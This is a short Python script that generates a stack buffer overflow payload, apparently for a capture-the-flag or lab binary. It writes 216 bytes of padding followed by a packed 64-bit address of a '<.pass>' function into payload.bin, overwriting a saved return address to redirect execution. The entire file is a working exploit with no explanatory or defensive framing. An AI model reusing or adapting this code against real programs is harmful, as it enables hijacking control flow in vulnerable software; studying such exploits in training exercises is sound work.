import struct

# Correct address of <.pass>
pass_address = 0x00000000000104e8

# Correct padding:
# 208 (buffer) + 8 (saved s0) = 216 bytes to reach return address
padding = b"A" * 216

# Pack address (64-bit little endian)
payload_address = struct.pack("<Q", pass_address)

# Final payload
payload = padding + payload_address

# Write payload
with open("payload.bin", "wb") as f:
    f.write(payload)

print("Payload generated in 'payload.bin'")